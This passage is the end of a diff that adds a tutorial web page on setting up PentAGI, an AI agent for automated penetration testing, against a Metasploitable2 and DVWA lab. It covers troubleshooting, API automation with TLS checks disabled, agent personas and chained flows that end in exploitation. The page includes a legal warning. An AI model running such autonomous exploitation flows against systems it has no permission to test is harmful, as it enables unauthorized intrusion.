+                                </tr>
+                                <tr>
+                                    <td>Flow stuck indefinitely</td>
+                                    <td>Target unreachable</td>
+                                    <td><code class="code">ping 192.168.56.101</code> — verify host-only adapter</td>
+                                </tr>
+                                <tr>
+                                    <td>port already in use: 8443</td>
+                                    <td>Conflict with another service</td>
+                                    <td><code class="code">sudo ss -tlnp | grep 8443</code> &rarr; kill process</td>
+                                </tr>
+                                <tr>
+                                    <td>SSL warning in browser</td>
+                                    <td>Self-signed cert</td>
+                                    <td>Click Advanced &rarr; Proceed (normal behavior)</td>
+                                </tr>
+                                <tr>
+                                    <td>No output from flow</td>
+                                    <td>Bad objective prompt</td>
+                                    <td>Rewrite with specific IPs, ports, and tool names</td>
+                                </tr>
+                                <tr>
+                                    <td>Metasploitable2 no IP</td>
+                                    <td>DHCP not configured</td>
+                                    <td><code class="code">ifconfig eth0 192.168.56.101 netmask 255.255.255.0</code>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td>docker compose: command not found</td>
+                                    <td>Wrong package installed</td>
+                                    <td>Use <code class="code">docker compose</code> (v2) not
+                                        <code class="code">docker-compose</code> (v1)
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 16 — Advanced Use Cases</h3>
+                    <h4>Automation via REST API</h4>
+                    <p>PentAGI exposes a full REST and GraphQL API for programmatic control:</p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash">import requests
+
+# Start a new pentest flow via API
+response = requests.post(
+    "https://localhost:8443/api/v1/flows",
+    headers={"Authorization": "Bearer YOUR_API_TOKEN"},
+    json={
+        "name": "Automated Daily Scan",
+        "description": "Scheduled vulnerability check",
+        "prompt": "Run a full vulnerability scan on 192.168.56.101 and report Critical and High findings only."
+    },
+    verify=False
+)
+print(response.json())</code></pre>
+                    </div>
+                    <h4>Custom Assistant Personas</h4>
+                    <p>In Assistants → + New Assistant, create specialized agents:</p>
+                    <div class="bg-color">
+                        <pre>
+Name: Web App Specialist
+System Prompt:
+You are a web application security expert.
+Focus exclusively on OWASP Top 10 vulnerabilities.
+For every finding, provide:
+1. The exact vulnerable URL and parameter
+2. The payload used
+3. OWASP category
+4. CWE ID
+5. Remediation code example</pre>
+                    </div>
+                    <h4>Chaining Multiple Flows</h4>
+                    <p>For large scopes (e.g., multiple subnets), create sequential flows:</p>
+                    <div class="bg-color">
+                        <pre>
+Flow 1: Recon 192.168.56.0/24 → Export JSON
+Flow 2: Deep scan flagged hosts → Export JSON
+Flow 3: Exploitation of confirmed vulns → Final report</pre>
+                    </div>
+                    <h4>Security & Legal Warning</h4>
+                    <div class="card-image-output">
+                        <img src="images/security-&-legal-warning.webp" alt="Security and Legal Warning">
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h2>Conclusion</h2>
+                    <p>PentAGI is not just another pentesting tool — it is a fundamental shift in how security
+                        professionals approach automated
+                        reconnaissance, vulnerability detection, and ethical hacking workflows.</p>
+                    <p>If you followed this tutorial from start to finish, you now have a fully working AI pentesting
+                        tool running on Kali
+                        Linux, a safe isolated lab with Metasploitable2 and DVWA, and hands-on experience running a
+                        complete automated pentest
+                        flow — from reconnaissance all the way to professional report generation.
+                    </p>
+                    <h4>Your Next Steps After This Tutorial</h4>
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Step</th>
+                                    <th>Action</th>
+                                    <th>Practice / Benefit</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>1</strong></td>
+                                    <td>Run 5 full PentAGI flows</td>
+                                    <td>Test against Metasploitable2 and DVWA before moving to new targets</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>2</strong></td>
+                                    <td>Learn Nmap manually</td>
+                                    <td>Understand what PentAGI automates under the hood</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>3</strong></td>
+                                    <td>Master Burp Suite</td>
+                                    <td>Deep web app testing that automated scanners can't fully replicate</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>4</strong></td>
+                                    <td>Study Metasploit</td>
+                                    <td>Understand the exploitation framework PentAGI orchestrates</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>5</strong></td>
+                                    <td>Get certified</td>
+                                    <td>eJPT &rarr; CEH &rarr; OSCP progression for career credibility</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <div class="pro-tips">
+                        <p><strong>⚠️ Final Legal Reminder:</strong> Everything covered in this tutorial is strictly for
+                            ethical,
+                            authorized, and educational use.
+                            Always obtain explicit written permission before testing any system you do not personally
+                            own. Unauthorized scanning or
+                            exploitation is a criminal offense under the CFAA (US), Computer Misuse Act (UK), IT Act
+                            Section 66 (India), and EU
+                            cybercrime directives.</p>
+                    </div>
+                </div>
+                <p>Found this tutorial helpful? Share it with your team, bookmark it for your next lab session, and
+                    check out our guides on
+                    <a href="../../Linux/nmap-tutorial-complete-guide-for-beginners-and-pentesters/nmap-tutorial-complete-guide-for-beginners-and-pentesters.html"
+                        class="link">Nmap for Beginners</a>.
+                </p>
+                <p class="keywords">
+                    <strong>Keywords:</strong> PentAGI setup guide | isolated penetration testing lab |
+                    Kali Linux VirtualBox Metasploitable2 | AI pentest agent tutorial |
+                    free hacking lab for beginners | DVWA Docker setup Kali |
+                    autonomous penetration testing AI | PentAGI Ollama local LLM |
+                    ethical hacking lab 2026 | Metasploitable2 exploit practice |
+                    vsftpd backdoor CVE-2011-2523 | SQL injection DVWA sqlmap |
+                    VirtualBox host-only network setup | Docker pentest environment |
+                    automated recon AI agents
+                </p>
+
+            </div>
+
+            <div class="next-section">
+                <div class="next">
+                    <div class="header">
+                        <h3>How to Set Up a Personal Cybersecuriy Lab with VirtualBox, Kali Linux & Metasploitable2
+                            (Free)</h3>
+                        <p class="tag">Tutorial</p>
+
+                    </div>
+                    <div class="content">
+                        <p>In this step-by-step guide, you will set up a free, production-grade ethical hacking lab on
+                            your own computer using
+                            VirtualBox, Kali Linux, and Metasploitable2 — the same tools used by real penetration
+                            testers, CEH candidates, and OSCP
+                            aspirants.
+                        </p>
+                        <a href="../set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2.html"
+                            class="next-button">Go To
+                            Tutorial</a>
+                    </div>
+                </div>
+
+                <div class="next">
+                    <div class="header">
+                        <h3>Linux Module 1: Advanced Command-Line Navigation & File System Operations</h3>
+                        <p class="tag">Tutorial</p>
+
+                    </div>
+                    <div class="content">
+                        <p>Learn Linux command-line mastery with this comprehensive, beginner-friendly tutorial
+                            covering
+                            filesystem navigation, file operations, and system fundamentals—ideal for aspiring
+                            system
+                            administrators and ethical hackers. This hands-on course features step-by-step labs,
+                            practical
+                            tips, and clear exercises to transform you into a confident Linux user.
+                        </p>
+                        <a href="../../Linux/linux-master-file-navigation-tutorial/index.html" class="next-button">Go To
+                            Tutorial</a>
+                    </div>
+                </div>
+
+                <div class="next">
+
+                    <div class="header">
+                        <h3>Networking Fundamentals I</h3>
+                        <p class="tag">Tutorial</p>
+
+                    </div>
+                    <div class="content">
+                        <p>Learn Networking Fundamentals I — a practical, beginner-friendly guide designed to
+                            give you a strong foundation in
+                            essential networking concepts.
+                        </p>
+                        <a href="../../../Networking/Tutorials/network-fundamentals-1/index.html" class="next-button">Go
+                            To Tutorial</a>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+        <!-- Right Side -->
+        <main class="right-column">
+            <div class="about-website moving-border">
+                <h3>About Website</h3>
+                <p><a class="homepage typewriter-scan" href="../../../index.html"><strong>DevspireHub</strong></a> is a
+                    beginner-friendly learning platform offering step-by-step tutorials in
+                    programming, ethical hacking,
+                    networking, automation, and Windows setup. Learn through hands-on projects, clear explanations, and
+                    real-world examples
+                    using practical tools and open-source resources—no signups, no tracking, just actionable knowledge
+                    to accelerate your
+                    technical skills.
+                </p>
+            </div>
+
+            <!-- Color palette -->
+            <div class="color-palette">
+                <div>
+                    <h3>Color Space</h3>
+                    <p>Discover Perfect Palettes</p>
+                </div>
+                <div class="palette-grid">
+                    <div class="palette-card">
+                        <!-- Color bars (set your palette colors here) -->
+                        <div class="color-wave colors-5">
+                            <div class="wave-bar" style="background:#F2C447" data-color="#F2C447"></div>
+                            <div class="wave-bar" style="background:#F76218" data-color="#F76218"></div>
+                            <div class="wave-bar" style="background:#FF1D68" data-color="#FF1D68"></div>
+                            <div class="wave-bar" style="background:#B10065" data-color="#B10065"></div>
+                            <div class="wave-bar" style="background:#740580" data-color="#740580"></div>
+                        </div>
+
+                        <div class="card-info">
+                            <div class="card-title">Sample Palette</div>
+                        </div>
+                    </div>
+                    <div class="button">
+                        <a href="../../../color-palettes/index.html" class="color-button">Go To Color Space Home
+                            Page</a>
+                    </div>
+                </div>
+            </div>
+            <div class="wallpaper">
+                <div>
+                    <h3>Featured Wallpapers (For desktop)</h3>
+                    <p>Download for FREE!</p>
+                </div>
+                <div class="image-grid">
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (1).png" alt="Wallpaper 1">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (23).png" alt="Wallpaper 23">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (46).png" alt="Wallpaper 46">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (81).png" alt="Wallpaper 81">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (111).png" alt="Wallpaper 111">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (116).png" alt="Wallpaper 116">
+                    </div>
+                </div>
+                <div class="button">
+                    <a href="../../../Wallpaper/index.html" class="wallpaper-button">Go To Wallpaper Home
+                        Page</a>
+                </div>
+            </div>
+
+            <div class="related-topics">
+                <div class="header">
+                    <h3>Open-Source Tools Directory</h3>
+                    <p><strong>Complete spectrum of open-source software in Github</strong>
+                    </p>
+                </div>
+                <div class="content">
+                    <ul>
+                        <li><i class="fas fa-code"></i><a
+                                href="../../../Resources/tools-directory/index.html#category-2"
+                                class="link">Programming</a></li>
+                        <li><i class="fas fa-globe"></i><a
+                                href="../../../Resources/tools-directory/index.html#category-3" class="link">Web
+                                Development</a></li>
+                        <li><i class="fas fa-network-wired"></i><a
+                                href="../../../Resources/tools-directory/index.html#category-4"
+                                class="link">Networking</a>
+                        </li>
+                        <li><i class="fas fa-shield-alt"></i><a
+                                href="../../../Resources/tools-directory/index.html#category-5" class="link">Ethical
+                                Hacking</a></li>
+                        <li><i class="fas fa-microchip"></i><a
+                                href="../../../Resources/tools-directory/index.html#category-6"
+                                class="link">Hardware</a>
+                        </li>
+                        <li><i class="fas fa-tasks"></i><a
+                                href="../../../Resources/tools-directory/index.html#category-7"
+                                class="link">Productivity</a></li>
+                    </ul>
+                </div>
+                <div class="button-container">
+                    <div class="btn-cyber">
+                        <span class="btn-bg"></span>
+                        <span class="btn-border"></span>
+                        <span class="btn-text">
+                            <a href="../../../Resources/tools-directory/index.html" class="related-button">
+                                Open-Source
+                                Tools</a> <span class="blink">_</span>
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="wallpaper">
+                <div>
+                    <h3>Featured Wallpapers (For desktop)</h3>
+                    <p>Download for FREE!</p>
+                </div>
+                <div class="image-grid">
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (1).png" alt="Wallpaper 1">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (23).png" alt="Wallpaper 23">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (46).png" alt="Wallpaper 46">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (81).png" alt="Wallpaper 81">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (111).png" alt="Wallpaper 111">
+                    </div>
+                    <div class="image-card">
+                        <img src="../../../Wallpaper/images_upscale/wallpaper (116).png" alt="Wallpaper 116">
+                    </div>
+                </div>
+                <div class="button">
+                    <a href="../../../Wallpaper/index.html" class="wallpaper-button">Go To Wallpaper Home Page</a>
+                </div>
+            </div>
+
+            <section class="deals-section">
+                <div class="deals-header">
+                    <h2>HOT DEALS</h2>
+                    <div class="deals-underline"></div>
+                </div>
+
+                <!-- Cards injected dynamically from amazon-links.json -->
+                <div class="deals-grid" id="dealsGrid">
+                    <div class="deal-skeleton">
+                    </div>
+                    <div class="deal-skeleton"></div>
+                    <div class="deal-skeleton"></div>
+                    <div class="deal-skeleton"></div>
+                    <div class="deal-skeleton"></div>
+                    <div class="deal-skeleton"></div>
+                </div>
+
+                <div class="deals-page-indicator" id="dealsPageIndicator"></div>
+
+                <div class="deals-nav">
+                    <button class="deal-arrow-btn" onclick="scrollDeals(-1)" aria-label="Previous">&#8592;</button>
+                    <button class="deal-arrow-btn" onclick="scrollDeals(1)" aria-label="Next">&#8594;</button>
+                </div>
+            </section>
+
+            <script async
+                src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2368356039533778"
+                crossorigin="anonymous"></script>
+            <!-- sidebar ads -->
+            <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2368356039533778"
+                data-ad-slot="5621407319" data-ad-format="auto" data-full-width-responsive="true"></ins>
+            <script>
+                (adsbygoogle = window.adsbygoogle || []).push({});
+            </script>
+
+            <script async
+                src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2368356039533778"
+                crossorigin="anonymous"></script>
+            <!-- sidebar ads -->
+            <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2368356039533778"
+                data-ad-slot="5621407319" data-ad-format="auto" data-full-width-responsive="true"></ins>
+            <script>
+                (adsbygoogle = window.adsbygoogle || []).push({});
+            </script>
+        </main>
+        <button id="scrollUpBtn" aria-label="Scroll to top" style="display:none;">
+            <svg class="progress-circle" viewBox="0 0 36 36">
+                <path class="bg1" d="M18 2.0845
+                          a 15.9155 15.9155 0 0 1 0 31.831
+                          a 15.9155 15.9155 0 0 1 0 -31.831" />
+                <path class="progress" d="M18 2.0845
+                          a 15.9155 15.9155 0 0 1 0 31.831
+                          a 15.9155 15.9155 0 0 1 0 -31.831" />
+                <span class="arrow-overlay">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 19V5M5 12L12 5L19 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                            stroke-linejoin="round" />
+                    </svg>
+                </span>
+            </svg>
+        </button>
+    </div>
+
+    <footer class="footer">
+        <ul class="menu">
+            <li class="menu-item"><a class="menu-link" href="../../../index.html">Home</a></li>
+            <li class="menu-item"><a class="menu-link" href="../../../Wallpaper/index.html">Wallpapers</a></li>
+            <li class="menu-item"><a class="menu-link" href="../../../color-palettes/index.html">Color Spaces</a></li>
+            <li class="menu-item"><a class="menu-link"
+                    href="../../../Resources/digital-resources/digital-resources-hub.html">Resources</a></li>
+            <li class="menu-item"><a class="menu-link" href="../../../Website/about/about.html">About</a></li>
+            <li class="menu-item"><a class="menu-link" href="../../../Website/contact/index.html">Contact</a></li>
+            <li class="menu-item"><a class="menu-link" href="../../../Website/privacy/index.html">Privacy policy</a>
+            </li>
+        </ul>
+        <div class="contacts">
+            <a class="contact github" href="https://github.com/kumaradoss16" target="_blank"><i
+                    class="fa-brands fa-github"></i></a>
+            <a class="contact instagram" href="https://www.instagram.com/devspirehub/" target="_blank"><i
+                    class="fa-brands fa-instagram"></i></a>
+            <a class="contact linkedin" href="https://www.linkedin.com/in/kumaradoss-s/" target="_blank"><i
+                    class="fa-brands fa-linkedin"></i></a>
+            <a class="contact facebook" href="https://www.facebook.com/profile.php?id=61577667990170&_rdr"
+                target="_blank"><i class="fa-brands fa-facebook"></i></a>
+            <a class="contact gmail" href="https://mail.google.com/mail/?view=cm&fs=1&to=devspirehub.website@gmail.com"
+                aria-label="Email us at devspirehub.website@gmail.com" title="Send us an email" target="_blank"
+                rel="noopener noreferrer">
+                <i class="fa-solid fa-envelope"></i>
+            </a>
+        </div>
+        <p>&copy;2026 DevspireHub | All Rights Reserved</p>
+    </footer>
+
+    <script src="script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="../../Linux/prism/prism.js"></script>
+</body>
+
+</html>
